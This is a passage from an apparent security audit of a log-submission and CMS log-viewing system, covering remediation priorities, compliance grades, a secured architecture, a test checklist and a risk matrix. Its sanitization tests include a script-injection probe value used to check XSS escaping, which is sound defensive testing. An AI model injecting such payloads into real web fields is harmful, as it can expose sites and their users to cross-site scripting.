  - Files: Nginx config, `shared/config/index.ts`
  - Effort: 4 hours
  - Risk if not fixed: **HIGH** - MITM attacks

- [ ] **H3.** Implement enhanced sensitive data patterns
  - Files: `player-vite/src/shared/logger/shared-logger.ts`
  - Effort: 3 hours
  - Risk if not fixed: **MEDIUM** - Credential leakage

- [ ] **H4.** Add log signature verification (HMAC)
  - Files: Client logger, backend verification
  - Effort: 6 hours
  - Risk if not fixed: **MEDIUM** - Log forgery

### Priority: MEDIUM (Implement Within 1 Month)

- [ ] **M1.** Implement field-level encryption for `stack_trace` and `user_agent`
  - Files: `backend-python/shared/crypto/field_encryption.py`
  - Effort: 8 hours
  - Risk if not fixed: **MEDIUM** - PII exposure in database dumps

- [ ] **M2.** Add GDPR erasure endpoint
  - Files: `backend-python/services/device/log_routes.py`
  - Effort: 4 hours
  - Risk if not fixed: **MEDIUM** - GDPR compliance gap

- [ ] **M3.** Implement buffer overflow warnings
  - Files: `player-vite/src/shared/logger/shared-logger.ts`
  - Effort: 1 hour
  - Risk if not fixed: **LOW** - Silent log loss

- [ ] **M4.** Add audit logging for log access
  - Files: `backend-python/services/device/log_routes.py`
  - Effort: 3 hours
  - Risk if not fixed: **LOW** - No forensic trail

### Priority: LOW (Nice to Have)

- [ ] **L1.** Implement certificate pinning for API calls
  - Effort: 4 hours
  - Risk if not fixed: **LOW** - Advanced MITM (unlikely in LAN)

- [ ] **L2.** Add log analytics dashboard (suspicious patterns)
  - Effort: 16 hours
  - Risk if not fixed: **LOW** - Manual threat detection only

- [ ] **L3.** Implement log compression before transmission
  - Effort: 3 hours
  - Risk if not fixed: **NONE** - Performance optimization only

---

## 9. Compliance Summary

### GDPR Compliance

| Requirement | Status | Implementation |
|-------------|--------|----------------|
| **Lawful Basis** | ✅ Legitimate interest | Documented in privacy policy |
| **Data Minimization** | ⚠️ Partial | Remove user_agent if not needed |
| **Storage Limitation** | ❌ Missing | **Implement 30-day retention** |
| **Purpose Limitation** | ✅ OK | Only used for debugging |
| **Security Measures** | ⚠️ Partial | **Add encryption + auth** |
| **Right to Access** | ✅ OK | CMS provides log viewing |
| **Right to Erasure** | ❌ Missing | **Implement GDPR erase endpoint** |
| **Data Breach Notification** | ✅ OK | Admin can export logs for audit |

**Overall GDPR Grade: C (Needs Improvement)**

### PCI-DSS (If Processing Payments)

| Requirement | Status | Notes |
|-------------|--------|-------|
| **No cardholder data in logs** | ✅ Assumed | Verify no payment info logged |
| **Encryption in transit** | ⚠️ Partial | **Enforce HTTPS** |
| **Encryption at rest** | ❌ Missing | **Implement field encryption** |
| **Access control** | ❌ Missing | **Add authentication** |
| **Audit trails** | ✅ OK | Timestamp + device_id logged |

**Overall PCI-DSS Grade: D (Requires Immediate Action)**

### OWASP Top 10 (2021)

| Vulnerability | Applies? | Mitigation Status |
|---------------|----------|-------------------|
| **A01: Broken Access Control** | ✅ Yes | ❌ **No auth on log submission** |
| **A02: Cryptographic Failures** | ✅ Yes | ⚠️ **No encryption at rest** |
| **A03: Injection** | ⚠️ Partial | ✅ Parameterized queries (SQL) <br> ❌ **No XSS sanitization** |
| **A04: Insecure Design** | ✅ Yes | ❌ **No rate limiting** |
| **A05: Security Misconfiguration** | ⚠️ Partial | ⚠️ **HTTP allowed in prod** |
| **A06: Vulnerable Components** | ⚠️ Unknown | Requires dependency audit |
| **A07: Authentication Failures** | ✅ Yes | ❌ **No authentication** |
| **A08: Data Integrity Failures** | ✅ Yes | ❌ **No log signatures** |
| **A09: Logging Failures** | ❌ No | ✅ Comprehensive logging |
| **A10: SSRF** | ❌ No | Not applicable |

**Overall OWASP Grade: D (High Risk)**

---

## 10. Recommended Security Architecture

### Secure Data Flow (After Implementation)

```
┌─────────────────────────────────────────────────────────────────┐
│ PLAYER DEVICE                                                    │
│                                                                  │
│  ┌──────────────────────────────────────────────────────────┐  │
│  │  SharedLogger                                             │  │
│  │  ✅ Redacts sensitive data (tokens, passwords, PII)      │  │
│  │  ✅ Redacts inline secrets (regex patterns)              │  │
│  │  ✅ Signs logs with HMAC (integrity verification)        │  │
│  │  ✅ Rate limits: 100 logs/hour (client-side)             │  │
│  │  ✅ Buffer limit: 100 logs max (memory protection)       │  │
│  └───────────────────────────┬──────────────────────────────┘  │
│                               │                                  │
│                               │ HTTPS (TLS 1.3)                  │
│                               │ + Device Token Auth              │
│                               ▼                                  │
└─────────────────────────────────────────────────────────────────┘
                                │
                ┌───────────────▼────────────────┐
                │ API GATEWAY / Nginx Reverse    │
                │                                 │
                │  ✅ TLS termination            │
                │  ✅ HSTS enforcement           │
                │  ✅ Rate limiting (IP-based)   │
                │  ✅ DDoS protection            │
                └───────────────┬────────────────┘
                                │
                ┌───────────────▼────────────────┐
                │ BACKEND API (FastAPI)          │
                │                                 │
                │  ✅ Device token verification  │
                │  ✅ Rate limiting (per-device) │
                │  ✅ HMAC signature verification│
                │  ✅ XSS sanitization           │
                │  ✅ Input validation (Pydantic)│
                │  ✅ Multi-tenancy checks       │
                └───────────────┬────────────────┘
                                │
                ┌───────────────▼────────────────┐
                │ DATABASE (PostgreSQL)          │
                │                                 │
                │  ✅ Field encryption (AES-256) │
                │  ✅ 30-day auto-deletion       │
                │  ✅ Organization isolation     │
                │  ✅ Audit trail (who accessed) │
                │  ✅ Backup encryption          │
                └────────────────────────────────┘
                                │
                ┌───────────────▼────────────────┐
                │ CMS ADMIN (React)              │
                │                                 │
                │  ✅ JWT authentication         │
                │  ✅ Role-based authorization   │
                │  ✅ XSS sanitization (DOMPurify)│
                │  ✅ Audit logging (who viewed) │
                │  ✅ GDPR erase button          │
                └────────────────────────────────┘
```

---

## 11. Post-Implementation Validation

### Security Testing Checklist

**Authentication Testing:**
- [ ] Attempt log submission without device_token → **Expect 401**
- [ ] Attempt log submission with expired token → **Expect 401**
- [ ] Attempt log submission with wrong device_id → **Expect 403**
- [ ] Attempt log viewing without JWT → **Expect 401**
- [ ] Attempt cross-org log viewing → **Expect 403**

**Rate Limiting Testing:**
- [ ] Send 11 logs in 1 minute from one device → **Expect 429 on 11th**
- [ ] Send 101 logs in 1 hour from one device → **Expect 429 on 101st**
- [ ] Send logs from 100 different IPs → **All succeed (no global limit)**

**Data Sanitization Testing:**
- [ ] Log message with `<script>alert(1)</script>` → **Escaped in CMS**
- [ ] Log with `password: secret123` → **Redacted to `***REDACTED***`**
- [ ] Log with JWT token → **Redacted to `eyJ***`**
- [ ] Log with email `user@example.com` → **Redacted to `us***@example.com`**

**Encryption Testing:**
- [ ] View raw database → **Stack traces encrypted**
- [ ] View via API → **Stack traces decrypted correctly**
- [ ] Rotate encryption key → **Old logs still decryptable**

**GDPR Testing:**
- [ ] Request GDPR erasure → **All device logs deleted**
- [ ] Wait 31 days → **Old logs auto-deleted**
- [ ] Check expires_at timestamps → **All future dates**

**Signature Verification Testing:**
- [ ] Send log with valid HMAC → **Accepted**
- [ ] Send log with invalid HMAC → **Rejected (401)**
- [ ] Replay old log with same signature → **Accepted** (add nonce to prevent)

---

## 12. Estimated Implementation Timeline

| Phase | Tasks | Duration | Dependencies |
|-------|-------|----------|--------------|
| **Phase 1: Critical Security** | C1-C4 (Auth, Rate Limiting, AuthZ, XSS) | 2 weeks | None |
| **Phase 2: Compliance** | H1-H2 (Retention, HTTPS) | 1 week | Phase 1 |
| **Phase 3: Enhanced Security** | H3-H4 (Enhanced patterns, HMAC) | 1.5 weeks | Phase 1 |
| **Phase 4: Encryption** | M1-M2 (Field encryption, GDPR erase) | 1.5 weeks | Phase 2 |
| **Phase 5: Monitoring** | M3-M4 (Warnings, Audit logs) | 1 week | Phase 3 |
| **Total** | | **7 weeks** | |

**Minimum Viable Security (MVS):** Complete Phase 1 + Phase 2 (3 weeks)

---

## 13. Risk Assessment Matrix

| Vulnerability | Likelihood | Impact | Risk Score | Mitigation Priority |
|---------------|------------|--------|------------|---------------------|
| **Log Injection (No Auth)** | HIGH | CRITICAL | 🔴 **9.5** | CRITICAL |
| **DoS via Log Flooding** | HIGH | HIGH | 🔴 **8.5** | CRITICAL |
| **Cross-Org Data Access** | MEDIUM | CRITICAL | 🟠 **7.5** | CRITICAL |
| **Stored XSS in CMS** | MEDIUM | HIGH | 🟠 **7.0** | CRITICAL |
| **GDPR Violation (Retention)** | HIGH | MEDIUM | 🟠 **6.5** | HIGH |
| **MITM (No HTTPS)** | LOW | CRITICAL | 🟠 **6.0** | HIGH |
| **Credential Leakage in Logs** | MEDIUM | MEDIUM | 🟡 **5.0** | HIGH |
| **Log Forgery (No HMAC)** | LOW | MEDIUM | 🟡 **4.0** | MEDIUM |
| **PII in Database Dumps** | LOW | MEDIUM | 🟡 **4.0** | MEDIUM |
| **No Audit Trail** | MEDIUM | LOW | 🟢 **3.0** | MEDIUM |

**Legend:**
- 🔴 **CRITICAL (8.0-10.0):** Immediate action required
- 🟠 **HIGH (6.0-7.9):** Address within 1 week
- 🟡 **MEDIUM (4.0-5.9):** Address within 1 month
- 🟢 **LOW (0-3.9):** Nice to have

---

## 14. Conclusion

The console interceptor implementation demonstrates **good baseline security practices** with automatic sensitive data redaction and smart object formatting. However, **critical security gaps** exist that must be addressed immediately:

### Must Fix (Before Production):
1. ❌ **Add authentication to log submission endpoint** (CRITICAL)
2. ❌ **Implement rate limiting** (CRITICAL)
3. ❌ **Add authorization to log viewing** (CRITICAL)
4. ❌ **Sanitize logs to prevent XSS** (CRITICAL)

### Must Fix (GDPR Compliance):
5. ❌ **Implement 30-day retention policy** (HIGH)
6. ❌ **Add GDPR erasure endpoint** (HIGH)
7. ❌ **Enforce HTTPS in production** (HIGH)

### Recommended (Enhanced Security):
8. ⚠️ **Implement log signatures (HMAC)** (MEDIUM)
9. ⚠️ **Add field-level encryption** (MEDIUM)
10. ⚠️ **Enhanced PII redaction patterns** (MEDIUM)

**Final Security Grade After Implementation:**
- **Current:** D (High Risk - Not Production Ready)
- **After Phase 1:** B (Acceptable)
- **After All Phases:** A- (Strong Security Posture)

**Audit Completed By:** Security Team
**Date:** 2025-01-22
**Next Review:** After Phase 1 implementation (2 weeks)
